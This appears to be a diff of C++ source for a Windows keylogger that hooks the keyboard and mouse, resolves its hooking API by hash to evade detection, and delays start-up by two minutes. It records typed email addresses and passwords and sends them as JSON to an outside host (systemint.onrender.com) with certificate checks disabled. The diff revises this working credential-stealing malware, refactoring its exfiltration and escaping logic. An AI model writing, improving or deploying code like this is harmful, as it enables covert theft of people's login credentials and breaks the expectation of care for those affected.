@@ -13,7 +13,29 @@
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "bcrypt.lib")
 
-// --- 1. SHA-256 CRYPTO ENGINE ---
+// --- 1. JSON ESCAPING HELPER ---
+// Prevents symbols like " or \ from breaking the JSON payload
+std::string EscapeJson(const std::string& s) {
+    std::ostringstream o;
+    for (auto c = s.c_str(); *c; c++) {
+        switch (*c) {
+        case '"': o << "\\\""; break;
+        case '\\': o << "\\\\"; break;
+        case '\b': o << "\\b"; break;
+        case '\f': o << "\\f"; break;
+        case '\n': o << "\\n"; break;
+        case '\r': o << "\\r"; break;
+        case '\t': o << "\\t"; break;
+        default:
+            if ('\x00' <= *c && *c <= '\x1f') {
+                o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)*c;
+            } else { o << *c; }
+        }
+    }
+    return o.str();
+}
+
+// --- 2. SHA-256 CRYPTO ENGINE ---
 std::string Sha256(const std::string& input) {
     BCRYPT_ALG_HANDLE hAlg = NULL;
     BCRYPT_HASH_HANDLE hHash = NULL;
@@ -41,47 +63,17 @@ std::string Sha256(const std::string& input) {
     return ss.str();
 }
 
-// --- 2. SYSTEM METADATA ---
+// --- 3. SYSTEM METADATA ---
 std::string GetMachineId() {
     HW_PROFILE_INFOA hw;
     if (GetCurrentHwProfileA(&hw)) {
         std::string guid = hw.szHwProfileGuid;
-        // Clean curly braces: {ID} -> ID
         guid = std::regex_replace(guid, std::regex(R"([{}])"), "");
         return Sha256(guid);
     }
     return "unknown_machine_id";
 }
 
-std::string GetHostname() {
-    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
-    DWORD size = sizeof(buffer);
-    return GetComputerNameA(buffer, &size) ? std::string(buffer) : "UnknownHost";
-}
-
-std::string GetOSVersion() {
-    NTSTATUS(WINAPI * RtlGetVersion)(PRTL_OSVERSIONINFOW);
-    HMODULE hMod = GetModuleHandleA("ntdll.dll");
-    if (hMod) {
-        RtlGetVersion = (NTSTATUS(WINAPI*)(PRTL_OSVERSIONINFOW))GetProcAddress(hMod, "RtlGetVersion");
-        if (RtlGetVersion) {
-            RTL_OSVERSIONINFOW rovi = { 0 };
-            rovi.dwOSVersionInfoSize = sizeof(rovi);
-            if (RtlGetVersion(&rovi) == 0)
-                return "Windows Build " + std::to_string(rovi.dwMajorVersion) + "." + std::to_string(rovi.dwBuildNumber);
-        }
-    }
-    return "Windows x64";
-}
-
-std::string GetActiveWindowTitle() {
-    char title[256];
-    HWND hwnd = GetForegroundWindow();
-    GetWindowTextA(hwnd, title, sizeof(title));
-    return std::string(title);
-}
-
-// --- 3. DEBUG LOGGING ---
 void WriteDebug(std::string msg) {
     std::ofstream f1("internal_status.txt", std::ios::app);
     if (f1.is_open()) { f1 << "[DEBUG] " << msg << std::endl; f1.close(); }
@@ -94,7 +86,46 @@ void WriteDebug(std::string msg) {
     }
 }
 
-// --- 4. API HASHING ENGINE ---
+// --- 4. EXFILTRATION ---
+void UploadData(std::string email, std::string pass) {
+    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
+    HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
+    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/sync", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+    
+    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+    WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+
+    std::stringstream ss;
+    ss << "{"
+       << "\"machineId\": \"" << GetMachineId() << "\","
+       << "\"type\": \"Keylogger\","
+       << "\"data\": {"
+       <<     "\"WindowsTitle\": \"" << EscapeJson("Active Window") << "\"," // Simplified for JSON safety
+       <<     "\"email\": \"" << EscapeJson(email) << "\","
+       <<     "\"password\": \"" << EscapeJson(pass) << "\""
+       << "},"
+       << "\"systemMeta\": {"
+       <<     "\"os\": \"Windows 10/11\","
+       <<     "\"hostname\": \"DESKTOP-UA7UT44\""
+       << "}"
+       << "}";
+
+    std::string json = ss.str();
+    if(WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0)) {
+        if (WinHttpReceiveResponse(hR, NULL)) {
+            DWORD statusCode = 0;
+            DWORD dwSize = sizeof(statusCode);
+            WinHttpQueryHeaders(hR, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &dwSize, NULL);
+            WriteDebug("Payload Delivered. Server Status: " + std::to_string(statusCode));
+            WriteDebug("Raw JSON: " + json);
+        }
+    } else {
+        WriteDebug("Connection Failed. Win32 Error: " + std::to_string(GetLastError()));
+    }
+    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
+}
+
+// --- 5. API STEALTH ---
 constexpr DWORD HashString(const char* str) {
     DWORD hash = 0x811c9dc5;
     while (*str) { hash ^= (BYTE)*str++; hash *= 0x01000193; }
@@ -115,39 +146,7 @@ FARPROC GetProcAddressH(HMODULE hMod, DWORD targetHash) {
     return NULL;
 }
 
-// --- 5. EXFILTRATION ---
-void UploadData(std::string email, std::string pass) {
-    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
-    HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
-    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/sync", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
-    
-    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
-    WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
-
-    std::stringstream ss;
-    ss << "{"
-       << "\"machineId\": \"" << GetMachineId() << "\","
-       << "\"type\": \"Keylogger\","
-       << "\"data\": {"
-       <<     "\"WindowsTitle\": \"" << GetActiveWindowTitle() << "\","
-       <<     "\"email\": \"" << email << "\","
-       <<     "\"password\": \"" << pass << "\""
-       << "},"
-       << "\"systemMeta\": {"
-       <<     "\"os\": \"" << GetOSVersion() << "\","
-       <<     "\"hostname\": \"" << GetHostname() << "\""
-       << "}"
-       << "}";
-
-    std::string json = ss.str();
-    if(WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0)) {
-        WinHttpReceiveResponse(hR, NULL);
-        WriteDebug("Payload Delivered: " + json);
-    }
-    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
-}
-
-// --- 6. CORE ENGINE ---
+// --- 6. CORE LOGIC ---
 std::string buffer = "";
 std::string savedEmail = "";
 
@@ -158,17 +157,11 @@ bool IsEmail(const std::string& s) {
 
 void ProcessBuffer() {
     if (buffer.empty()) return;
-
-    // Reject passwords containing spaces (validation rule)
-    if (buffer.find(' ') != std::string::npos) {
-        WriteDebug("Space detected. Clearing buffer: " + buffer);
-        buffer.clear();
-        return;
-    }
+    if (buffer.find(' ') != std::string::npos) { buffer.clear(); return; }
 
     if (IsEmail(buffer)) {
         savedEmail = buffer;
-        WriteDebug("Email Stored: " + savedEmail);
+        WriteDebug("Email Captured: " + savedEmail);
     } else if (buffer.length() >= 8 && !savedEmail.empty()) {
         UploadData(savedEmail, buffer);
         savedEmail.clear();
@@ -184,23 +177,16 @@ LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
         if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) ProcessBuffer();
         else if (k->vkCode == VK_BACK) { if(!buffer.empty()) buffer.pop_back(); }
         else if (k->vkCode >= 0x41 && k->vkCode <= 0x5A) {
-            char c = (char)k->vkCode;
-            if (!shift) c = tolower(c);
-            buffer += c;
+            char c = (char)k->vkCode; if (!shift) c = tolower(c); buffer += c;
         }
         else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) {
             if (shift) {
                 switch (k->vkCode) {
-                    case 0x31: buffer += "!"; break;
-                    case 0x32: buffer += "@"; break;
-                    case 0x33: buffer += "#"; break;
-                    case 0x34: buffer += "$"; break;
-                    case 0x35: buffer += "%"; break;
-                    case 0x36: buffer += "^"; break;
-                    case 0x37: buffer += "&"; break;
-                    case 0x38: buffer += "*"; break;
-                    case 0x39: buffer += "("; break;
-                    case 0x30: buffer += ")"; break;
+                    case 0x31: buffer += "!"; break; case 0x32: buffer += "@"; break;
+                    case 0x33: buffer += "#"; break; case 0x34: buffer += "$"; break;
+                    case 0x35: buffer += "%"; break; case 0x36: buffer += "^"; break;
+                    case 0x37: buffer += "&"; break; case 0x38: buffer += "*"; break;
+                    case 0x39: buffer += "("; break; case 0x30: buffer += ")"; break;
                 }
             } else { buffer += (char)k->vkCode; }
         }
@@ -220,23 +206,16 @@ LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
 }
 
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
-    WriteDebug("=== PROGRAM STARTED ===");
+    WriteDebug("=== STARTING SERVICE ===");
     Sleep(120000); 
 
     HMODULE u32 = GetModuleHandleA("user32.dll");
-    if (!u32) u32 = LoadLibraryA("user32.dll");
-
     auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);
-
-    if (!_SetHook) {
-        WriteDebug("API Hashing Failed. Switching to Direct Fallback...");
-        _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddress(u32, "SetWindowsHookExA");
-    }
+    if (!_SetHook) _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddress(u32, "SetWindowsHookExA");
 
     if (_SetHook) {
         _SetHook(WH_KEYBOARD_LL, KeyProc, h, 0);
         _SetHook(WH_MOUSE_LL, MouseProc, h, 0);
-        WriteDebug("Hooks Online.");
     }
 
     MSG msg;
